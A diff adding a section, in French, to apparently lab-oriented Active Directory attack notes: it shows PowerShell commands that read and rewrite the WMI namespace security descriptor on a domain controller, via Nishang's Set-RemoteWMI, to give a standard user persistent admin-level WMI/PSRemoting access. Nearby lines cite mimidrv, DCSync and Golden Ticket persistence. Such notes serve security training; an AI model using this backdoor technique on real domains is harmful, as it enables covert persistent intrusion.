@@ -59,6 +59,25 @@ Si LSASS tourne en processus protégé (PPL), charger d'abord le driver `mimidri
 
 > [!note] Non persistant au reboot, et connu pour casser AD CS. À réserver à un accès court ; préférer DCSync / Golden pour une persistance durable.
 
+### WMI namespace security descriptor — accès WMI/PSRemoting sans être admin local (F22)
+
+> Modifier le security descriptor du namespace WMI `root\cimv2` sur le DC : ajouter un user standard (`studentx`) avec les mêmes permissions que **BA** (Builtin\Administrators) → accès `Invoke-WmiMethod` / PSRemoting persistant sans appartenir à Administrators.
+
+> [!warning]- Required
+> Contexte DA sur la cible (pour lire/écrire le security descriptor du namespace WMI).
+
+```powershell
+# 1. Lire le SD actuel de root\cimv2 pour repérer les permissions BA (bits SDDL type CCDCLCSWRPWPRCWD)
+$sd = Invoke-WmiMethod -Namespace root/cimv2 -Path "__systemsecurity=@" -Name GetSecurityDescriptor -ComputerName dcorp-dc
+([wmiclass]"\\dcorp-dc\root\cimv2:Win32_SecurityDescriptorHelper").BinarySDToSDDL($sd.Descriptor).SDDL
+
+# 2. Injecter l'ACE studentx via Set-RemoteWMI (Nishang)
+. C:\AD\Tools\Set-RemoteWMI.ps1
+Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
+```
+
+Bits SDDL : `CC` CreateChild, `DC` DeleteChild, `LC` List, `SW` Self-Write, `RP` ReadProp, `WP` WriteProp, `RC` ReadControl, `WD` WriteDac. `CI` = Container-Inherit. L'ACE injectée aura la forme `(A;CI;CCDCLCSWRPWPRCWD;;;<SID_studentx>)`.
+
 ### Repères génériques Windows (secondaire)
 
 ```powershell
